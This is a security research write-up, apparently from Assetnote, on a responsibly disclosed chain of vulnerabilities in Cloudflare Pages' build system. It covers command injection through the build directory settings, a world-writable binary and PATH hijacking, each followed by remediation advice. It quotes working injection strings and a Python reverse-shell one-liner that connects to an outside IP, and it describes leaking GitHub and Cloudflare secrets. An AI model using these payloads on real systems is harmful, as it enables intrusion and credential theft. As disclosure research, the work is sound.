---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-06_cloudflare-pages-part-1-the-fellowship-of-the-secret.md
original_filename: 2022-05-06_cloudflare-pages-part-1-the-fellowship-of-the-secret.md
title: 'Cloudflare Pages, part 1: The fellowship of the secret'
category: documents
detected_topics:
- command-injection
- supply-chain
- information-disclosure
- api-security
- oauth
- idor
tags:
- imported
- documents
- command-injection
- supply-chain
- information-disclosure
- api-security
- oauth
- idor
language: en
raw_sha256: 05ad6d990f0ab32dfa550897a089b251081fe28ed6f1b1120ce8e05ead0dfac9
text_sha256: ae4160f2927f0e8a27f6cf9c751f1c34253aafd24b3ce969c7e9358521918186
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Cloudflare Pages, part 1: The fellowship of the secret

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-06_cloudflare-pages-part-1-the-fellowship-of-the-secret.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, information-disclosure, api-security, oauth, idor
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `05ad6d990f0ab32dfa550897a089b251081fe28ed6f1b1120ce8e05ead0dfac9`
- Text SHA256: `ae4160f2927f0e8a27f6cf9c751f1c34253aafd24b3ce969c7e9358521918186`


## Content

---
title: "Cloudflare Pages, part 1: The fellowship of the secret"
url: "https://www.assetnote.io/resources/research/cloudflare-pages-part-1-the-fellowship-of-the-secret"
final_url: "https://www.assetnote.io/resources/research/cloudflare-pages-part-1-the-fellowship-of-the-secret"
authors: ["Sean Yeoh (@seanyeoh)", "James Hebden (@devec0)"]
programs: ["Cloudflare"]
bugs: ["Command injection", "Container escape", "Bash Path injection", "RCE", "Local Privilege Escalation", "Information disclosure"]
publication_date: "2022-05-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2658
---

[Research Notes](/resources/research)

Security Research

May 6, 2022

# Cloudflare Pages, part 1: The fellowship of the secret

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

![Bart Simpson sliding down a staircase, before falling off the railing and hitting each stair on the way down. bart is labelled with the words 'cloudflare pages' and the steps are labeled with various security issues.](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/659feb72bf22b29b278079d0_bart-slide.png)

  * [Introduction](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#introduction)
  * [Overview of Cloudflare Pages](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#overview-of-cloudflare-pages)
  * [🤔](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#-yes-this-is-the-heading)
  * [Diving Deeper into Cloudflare Pages](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#diving-deeper-into-cloudflare-pages)
  * The Treasure Map
  * [The CTF](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#cloudflare-build_tools-ctf)
  * [Command Injection in CLONE_REPO](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#flagthats_a_lot_of_app_installs---command-injection-in-clone_repo)
  * [Command Injection in PUBLIC_ASSETS](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#flagcloudflare_for_cloudflare---command-injection-in-publish_assets)
  * [chmod 777](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#flagtheres_no_way_we_can_overwrite_that---chmod-777-pages_metadata_generator)
  * [Path Injection](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#flagits_oscp_all_over_again---path-injection)
  * [Part 2](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/#part-2)

### Introduction

Before we get into this lengthy post, we’d like to thank both Cloudflare and HackerOne for working with us on these vulnerabilities. The process of reporting, remediating and validating these problems was undertaken with the utmost professionalism and diligence by all parties. We’ll be presenting the writeup in multiple parts: [part 1](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/), [part 2](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt2/), and [part 3](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt3/).

Cloudflare have also released a blog post detailing their experience with receieving these reports and how things transpired on their end [on the Cloudflare blog](https://blog.cloudflare.com/pages-bug-bounty).

This story all started with our engineering team trying to solve that age old problem: how to serve static files, via HTTP, on the WWW. Simple, right?

As many people reading this blog will know, Assetnote makes a number of wordlists useful for reconnaissance and enumeration available for free at [wordlists.assetnote.io](https://wordlists.assetnote.io/), and we are always looking for ways to streamline the updates and publishing of this data - whilst keeping the downloads fast and free. So, naturally, we found ourselves shopping around for CDNs and static hosting options - when we hit Cloudflare’s new (at the time) Pages offering.

Being a bunch of hackers, of course, we couldn’t simply evaluate a new technology. We couldn’t simply weigh the pros and cons of the service against the cost. Call it doing due diligence, call it the age old crime of curiosity - we had to try and hack it.

Along this journey, we found a few things. Command injection, container escapes, our Github tokens, Cloudflare’s Github tokens, Cloudflare API Keys to Cloudflare Organisation, and Cloudflare’s Azure API tokens amongst other things.

### Overview of Cloudflare Pages

Cloudflare Pages operates as a continuous deployment service triggered by commits to a connected Github or Gitlab repository. Using pages is simple, and this was one of the reasons we were looking at it initially. Deployments are automated, and Cloudflare’s global content network has good performance and the pricing is reasonable. The process looks something like this -

  1. You grant Cloudflare some oauth permissions to read your repository, as a connected oauth app.
  2. Each time a commit is pushed to a target branch, Cloudflare will pull your code, run some user specified actions against the code (e.g. npm build, hugo or whatever build tools you use), then upload your built resources to Cloudflare’s servers
  3. Cloudflare Pages gives you a nice pages.dev URL.

In the screenshot below, you can see our very clean and legitimate deployment history for our very important cloudshell2pls website.

![a very sketchy looking list of failed builds we used to run our reverse shells on Cloudflare pages](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a695dc178579d86d423c07_cloudshell2pls.png)

Some of the levers you can tune in your build include:

  * The build command;
  * The output and root directory to use inside the build environment;
  * Environment Variables to inject into the build

![a list of build configurations including: build command, build output directory, root directory and build branch.](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a695e6911810a3c2a77366_build-config.png)

### 🤔 (yes this is the heading)

So naturally, as very non-malicious and security conscious individuals with a natural curiosity for how things work - a few thoughts popped into our heads:

  * Where is Cloudflare running our builds?
  * How is Cloudflare isolating our builds?
  * How is Cloudflare accessing our repository?
  * Where are these environment variables stored and can we get access to them?
  * Can we mine crypto on this? what kind of compute resources are available?
  * What else can we access from inside the build environment’s internal network?

### Diving Deeper into Cloudflare Pages

Our first intuition was to drop into the cloudflare pages worker and figure out exactly what is happening when a build is running.

Thankfully, pages lets us specify arbitrary build commands for running the build. So naturally, our website is going to build a reverse shell.

Dropping into our reverse shell, we can see the process tree, and which parent process is calling our build script. Interestingly, this informs us where the build scripts we’re executing are located - as we can see different paths prefixing the parent processes. The scripts are running from some pretty suspect <span class="code_single-line">/__a/</span> and <span class="code_single-line">/__w/</span> directories - which are definitely not part of the base Linux system. (These directories are important, we’ll later find out the pages product uses Azure DevOps pipelines under the hood, and this is how azure pipelines distributes its agents and configuration files with cloud-init).

From this point, we decided to start investigating exactly how this build process works. Some obvious starting points from the process listing was our parent process, <span class="code_single-line">/opt/pages/build_tools/build.sh</span> and also <span class="code_single-line">build_tool/main.py</span>. While digging around those files, we also found an <span class="code_single-line">azure_pipelines.yml</span> in a commandline argument, which informed us of how things would piece together as we step through this writeup.

Sean also had some ideas about exploring variable substitutions in unusual places, and James at this point also had ideas about trying to understand better which container runtime we were in and as such our investigation upward through the process tree began.

### The treasure map - Azure_piplines.yaml

Before we dive into each individual bug, its important we first map out where we’re looking for gold. This is an important step in approaching unknown systems - mapping the attack surface. In our case, understanding the azure pipelines gave us pointers on how the entire process fit together, and where in the process hierarchy we were at with our build reverse shell.

![a YAML formatted document showing a series of steps for running the build on Azure DevOps pipelines, including calls to build.sh \(the build agent which runs our build\)](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a6961f88d1958ec6148922_azure-pipelines.png)

From their <span class="code_single-line">azure_pipielines.yaml</span> we could see a series of jobs that each would execute one step in the build.sh process. Importantly, we could see private keys and secrets sprinkled throughout the jobs, but, we were in probably the build-assets step on line 37, which unfortunately had no environment variables.

What would be juicy though, was breaking into the publish-assets or fetch-code steps to pull the <span class="code_single-line">GITHUB_PROD_PRIVATE_KEY</span> and the <span class="code_single-line">CF_PROD_API_TOKEN</span>.

### Cloudflare build_tools CTF

Diving into the buildtools scripts, this quickly felt like a ctf challenge. Provided with a series of deployment scripts and finding the fastest way to get RCE (or, the flag, because we’re still pretending this is a CTF).

The build.sh script dropped permissions to the buildbot user and executed our build_tool/main.py. Our build script is executed in the context of this user as a result, so if we want to escalate our privileges, we’ll need to find a way to do it before the below <span class="code_single-line">sudo</span> happens.

![a python script which uses the argparse library to specify various configuration parameters for the build, most interestingly parameters like env-vars, output-dir and build-command match configuration boxes on the Cloudflare pages web UI build configuration](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a6963fe959c84901ee3e7e_build-main.png)

With build_tool being run as a non-privileged user, we need to run some commands prior to it being invoked if we want to be able to escalate privileges. And we need to escalate privileges if we want to poke around some more, and potentially escape from what looks like a container.

From here we began to dive into the treasure sites we identified with the <span class="code_single-line">azure_pipelines.yml</span> : <span class="code_single-line">CLONE_REPO</span> and <span class="code_single-line">PUBLISH_ASSETS</span>.

### flag{thats_a_lot_of_app_installs} - Command Injection in CLONE_REPO

Realistically, we probably should not have had access to the <span class="code_single-line">azure_pipelines.yml</span> file. But we do, so let’s dig into it. We know that the <span class="code_single-line">build_tool</span> we looked at previously is called by the pipeline configuration, and the <span class="code_single-line">CLONE_REPO</span> step would have some juicy secrets. In the snippet below, we can see them using the tokens injected to clone the repository, then some validation on the path, and finally moving the results to the final directory.

![a python snippet from the build agent, showing the fetch_github_archive function, which uses a function called run_cmd to shell out, and references the clone directory we potentially control](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a6966b5f57c0f5f3b0abd4_fetch-github-archive-python.png)

Typically in python, the recommended way to execute commands is providing a list of arguments, which would prevent any kind of shell escaping or evaluation, e.g.

useless_cat_call = subprocess.Popen(["cat", “filename”, user_input], … text=True)

However, in this case, our script was very helpful in providing our user controlled root_dir straight into a <span class="code_single-line">mv</span> command on line 74. The next logical step here is to investigate whether or not root_dir can be controlled. So, what is the root_dir and is it user controlled?

Going back to the Cloudflare UI, the build configuration allowed us to modify the “root directory” of the build. Looks familiar, right? It turns out this is indeed rendered as the root_dir referenced in the above snippet, so we can control a parameter to the <span class="code_single-line">mv</span> command in the deployment scripts being called by the Azure DevOps pipeline. So, our next step is to see if we can do something useful like dumping environment variables or running commands, and seeing if we are running these commands outside of our original security context.

![a screenshot of the build configuration from the cloudflare pages UI showing the path setting modified to be 'f;env>/tmp/bar.txt;echo' with the error test 'Please enter a valid path' below](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a696776353878367c40ad5_hacked-path-ui.png)

There were three gotcha’s here though. Firstly, as evident in the source code above, we were having our root directory checked as existing in the repo (solid defensive programming here, it’s a great idea to do this!). Secondly, messing with where the repository was moved to, would prevent our build from being able to run. Thirdly, the control panel would not let us submit our very legitimate root directory for our build configuration, due to validation which was in place, preventing special characters from being entered.

Bypassing the validation of root_dir can easily be remedied. Thanks to the beauty and flexibility of linux - there is a lot of freedom in which characters are allowed in a directory name. <span class="code_single-line">mkdir -p ‘f;env>/tmp/bar.txt;echo’</span> solved our problem allowing for this pass without any fanfare. This creates a directory with the same name as our command injection, so when the path is checked to see if it exists, it does. Now, the remainder of our shell injection will be allowed, and then executed.

![a console directory listing showing a hierarchy of folders, starting at 'f;env>' with child folders 'tmp', 'bar.txt;' and 'bar.txt;echo'](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a696816778af0fba7af32b_i-cant-believe-these-paths.png)

The build directory pollution however broke the build. The checkout failed, so the build script was not present to be called later in the build. This was resolved by executing a command that did not rely upon anything in the repo. In our case, directly executing base64 /tmp/bar.txt or cat /tmp/bar.txt would work regardless of whether the checkout failed or if we were executing in the wrong directory. Using built-in commands and known, absolute paths when testing command injections is always a good debugging step which can help you validate your command injection before moving onto more complex payloads.

Finally, the input validation. We thought this might be a bit of a challenge, but thankfully, this was only client-side validation, performed by the frontend Javascript. A quick burp repeater session on a valid POST request to update the project settings led us on our merry way, allowing us to inject our spicy settings without validation.

![a screenshot of the burp repeater, with the request produced by updating the path in the build configuration loaded. the invalid path setting has been manually submitted and a 200 response has been returned from the cloudflare pages API, indicating the setting was accepted.](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a6968e86c66f7f22246bde_burp-path.png)

Triggering another build after updating the build command, we can now ech our our /tmp/bar.txt file back to the build logs. The base64-encoded data contained all environment variables set in the context of the early build. It contained many good secrets, most notably a GitHub private key.

![a screenshot of the build progress in the cloudflare UI showing a base64 blob which contains the private environment variables from the build agent when decoded.](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a696a82f514de084b5e35d_env-dump-base64-ui.png)

_“But Sean & James”_ you may ask, _“private keys are neat and all, but what if they’re duds, what if they do nothing?”_ Fear not reader, we asked ourselves the same question. We sought to validate the keys before getting too excited. Using the GitHub API, we found that these keys were able to get us read and write permissions as the cloudflare-pages github integration app.

![a screenshot of a curl request against the github API, which shows the private key in use, accessing the details of the "cloudflare-pages" github app](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a696bc6353878367c44a3f_github-api-curl.png)

And given the app was not scoped to each user, we consequently had access to all 18290 users’ repositories who had granted Cloudflare Pages access :) :) :)

<span class="code_single-line">flag{thats_a_lot_of_app_installs}</span> get! A straight forward CTF challenge involving some input validation bypasses and a little bit of source code auditing. Who said PlaidCTF wasn’t a good place to practice bounties.

We talked a little about secure coding practices which would help here, and to summarise that thought - remediating these issues would involve a few defensive mechanisms at different points:

  * Relying on client-side validation here was a mistake. Server side validation of the input to root_dir would prevent us from being able to inject parameters for injection
  * Treating user input as untrusted at all levels of the stack is good practice. Proper argument escaping and handling of arguments in the shell commands and in the python script would have prevented our command injections. We can use shutil.move() instead of a subshell for mv, and use python subprocess calls with list based arguments, instead of strings, to avoid shell escapes in the git commands. For example, using subprocess.call([‘mv’, src_file, dest_dir]) does not allow the insertion of special shell control characters such as ‘;’, and also does not spawn the command in a shell interpreter by default. Also, avoid using the shell=True argument unless absolutely necessary.
  * Finally, using a user or repository scoped token for each git clone would prevent a breach of this step from affecting all users who gave cloudflare-pages access. A token scoped to only the repository or user that gave access, would mean a breach gave no more access than we already had in the build step, preventing a large-scale credential and data breach, which is what we could have caused if we were bad actors.

### flag{cloudflare_for_cloudflare} - Command Injection in PUBLISH_ASSETS

Having gotten a good hit of dopamine from the <span class="code_single-line">CLONE_REPO</span> step, we looked towards getting some more flags from the PUBLISH_ASSETS step.

The implementation for <span class="code_single-line">publish_assets</span> involved a few steps:

  * Performing some input validation on the user supplied output_dir;
  * Updating some log files that we can’t control
  * Executing pages-metadata-generator, a custom script added by Cloudflare, with the asset_dir

![a screenshot of the store_assets function in the build agent code, most notably showing a call to an executable named 'pages-metadata-generator', also referencing the output dir which we can control via build configuration](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a6970e8f709dd594c78fef_store-assets.png)

Very similar to the <span class="code_single-line">CLONE_REPO</span> command execution vulnerability, we similarly had a command injection in our 3rd step of executing the pages-metadata-generator with some user-controlled input. We could supply an output_dir like bash <span class="code_single-line">/tmp/shell.sh</span> and as long as a directory with that name existed in the repository, we would be fine.

Copying our reverse shell to /tmp/shell.sh in the build step, then creating our malicious <span class="code_single-line">output_dir</span> location with <span class="code_single-line">mkdir -p ';bash /tmp/shell.sh;echo '</span> allowed us to drop straight into a shell on the next build.

![a screenshot of the build configuration UI showing a modified output directory, including our reverse shell command ';bash /tmp/shell.sh;echo'](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a6971886c66f7f2224df63_output-dir.png)

![a screenshot of the reverse shell showing the output of env grep CF which includes a bunch of different prod and staging cloudflare API keys](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a6971ea00418ba65ffe556_output-dir-shell.png)

And we’re back. Here we have more spicy environment variables, this time we have the API tokens used to communicate with the Cloudflare API. We didn’t shake anything too spooky out of this, but we did have access to Cloudflare pages’ own Cloudflare project with these keys - certainly these keys were not meant to be accessible to simple users such as ourselves, so we left it there and did not attempt further exploitation.

Remediation of this issue is very similar to above:

  * Having server side validation of inputs for suspicious or invalid symbols in directory names would have mitigated the issue
  * Having properly handled and escaped user arguments to the subprocess would have ultimately prevented the vulnerability as well.
  * As for using cloudflare’s API keys, they may have been able to get away with a tighter scoped or api specific token instead of a cloudflare API wide token.

### flag{there’s_no_way_we_can_overwrite_that} - Chmod 777 pages_metadata_generator

After our initial report for the command injection, Cloudflare were very fast to remediate our issue, having a fix within two days. However, we were determined to hack our way back in, and depriving us of our right to use Cloudflare’s own API keys was unjust!

Diving again through the filesystem, we began searching for binaries that were left with liberal permissions, and found that our friendly <span class="code_single-line">/opt/pages/bin/pages-metadata-generator</span> called in <span class="code_single-line">PUBLISH_ASSETS</span> was actually marked as <span class="code_single-line">rwxrwxrwx</span>, that is, world readable, world writable and world executable (<span class="code_single-line">chmod 0777</span>). Our hunch was, if we could write to this file from our build step, then the <span class="code_single-line">PUBLISH_ASSETS</span> step might just re-use our poisoned file and give us access again to those keys.

Our hunch was right…

We set up our build script to manipulate the <span class="code_single-line">pages-metadata-generator</span> file to be a bash script that called our reverse shell.

#!/bin/bash

cp pages-metadata-generator /opt/pages/bin/pages-metadata-generatorpages-metadata-generator:

#!/bin/bash

echo "henlo fren"

export > /tmp/envvars
  
  
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.184.89.99",9448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
  
  

Aaand after triggering another build, we see our reverse shell executing underneath the <span class="code_single-line">pages-metadata-generator</span> job.

![a pstree showing our current shell running as a child process of the pages-metadata-generator process](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a69760d15be076353bd9f8_pstree-pages-metadata.png)

The mitigation for this issue was as simple as locking down the world-writable permissions on the binaries. An alternative solution was to re-mount the binaries from outside the container on each step, ensuring that any modification to core binaries would be overwritten on each step.

### flag{its_oscp_all_over_again} - Path injection

After fixing the permissions error, we were back to scratching our heads. We were running out of ideas. There were no more world writable binaries, no more command injections and we still wanted our Cloudflare given right to use Cloudflare’s API keys.

After looking through the information we had, we noticed that as part of Cloudflare’s compatibility with a wide range of build systems and configurations, they had _many_ PATH entries. Namely, the following directories are prepended to the <span class="code_single-line">PATH</span>:
  
  
  PATH=/opt/buildhome/.swiftenv/bin:/opt/buildhome/.swiftenv/shims:/opt/buildhome/.php:/opt/buildhome/.binrc/bin:/usr/local/rvm/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/buildhome/.cask/bin:/opt/buildhome/.gimme/bin:/opt/buildhome/.dotnet/tools:/opt/buildhome/.dotnet
  
  

Additionally, commands run were all using just the <span class="code_single-line">bash</span> command. Without an absolute path. This meant that if we were able to create a malicious <span class="code_single-line">bash</span> binary, in one of these path locations, we would be able to break out of the build step once again. Thankfully, files created in the /opt/buildhome directory persist across task executions. Therefore, creating an executable at <span class="code_single-line">/opt/buildhome/.swiftenv/bin/bash</span> allowed us to hijack future build steps and hence execute commands again in each subsequent step.

Our next build dropped us into a shell - and it was executing in a higher privilege than before! This time as the <span class="code_single-line">AzDevops</span> user, before we even get to executing the cloudflare build scripts, and the <span class="code_single-line">sudo</span> to the lower privileged <span class="code_single-line">buildbot</span> user! This account additionally has passwordless <span class="code_single-line">sudo</span> access, so we were able to access the <span class="code_single-line">root</span> account in the container. This gave us a lot more latitude for poking around.

![a screenshot of a process tree from within a reverse shell, showing our process is running as the AzDevOps+ user we mentioned previously](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/659fec426624e587105674ce_pstree-azdevops.png)

Remediating this issue involved any or all of the following methods:

  * Restricting the directories added to the paths to limit what binaries could be created in the. Marking the directories as non-world writable would have limited the impact here
  * Using absolute paths when using binaries like <span class="code_single-line">bash</span> for executing scripts would have prevented us from hijacking a higher build step

At this point, we cut a report for the above issues.

### Part 2

Turns out, we were just getting started. Being able to access the <span class="code_single-line">AzDevOps</span> accounts requires further investigation. Additionally, as we reported each injection vulnerability, it was patched, and we had to find news ways to escape from the <span class="code_single-line">buildbot</span> user. We’ll discuss this part of the writeup in [part 2: the two privescs](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt2/).

Written by:

James Hebden

Sean Yeoh

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
